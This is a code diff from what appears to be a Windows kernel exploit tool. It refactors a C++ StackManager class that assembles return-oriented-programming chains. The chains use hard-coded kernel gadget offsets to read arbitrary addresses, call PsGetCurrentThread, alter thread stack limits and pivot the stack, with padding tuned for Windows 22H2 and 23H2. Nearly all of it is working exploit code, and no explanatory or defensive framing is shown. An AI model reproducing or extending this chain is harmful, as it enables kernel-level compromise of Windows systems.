@@ -35,16 +35,13 @@ void StackManager::AddPadding(const std::size_t PaddingSize)
 
 void StackManager::ReadIntoRcx(const std::uint64_t ReadAddress)
 {
-    // TODO: Remove this from here
-    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
-
     this->AddGadget(0xbac75c, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddValue(ReadAddress, "read address");
     this->AddPadding(0x18);
 
     this->AddGadget(0x27af45, "mov rax, qword ptr \[rax\]; ret;");
     this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
-    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
+    if (Globals::WindowsBuild == "22H2" || Globals::WindowsBuild == "23H2")
         this->AddPadding(0x28);
 
     // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
@@ -101,9 +98,6 @@ void StackManager::ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBas
 
 void StackManager::PivotToNewStack(StackManager* NewStack)
 {
-    // TODO: Remove this from here
-    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
-
     this->AddFunctionCall("PsGetCurrentThread");
     this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x8);
@@ -149,7 +143,7 @@ void StackManager::PivotToNewStack(StackManager* NewStack)
     // r9=rax, IMPORTANT NOTE: On some windows builds this includes "add rsp, 0x28;" and on some not,
     // if yours includes it, then you must account for this in the check which decides if padding should be added
     this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
-    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
+    if (Globals::WindowsBuild == "22H2" || Globals::WindowsBuild == "23H2")
         this->AddPadding(0x28);
 
     // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
@@ -202,7 +196,7 @@ void StackManager::PivotToNewStack(StackManager* NewStack)
 
     // same as above r9->rax->rcx, this is being stored here so we can overwrite rax for xor operation
     this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
-    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
+    if (Globals::WindowsBuild == "22H2" || Globals::WindowsBuild == "23H2")
         this->AddPadding(0x28);
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
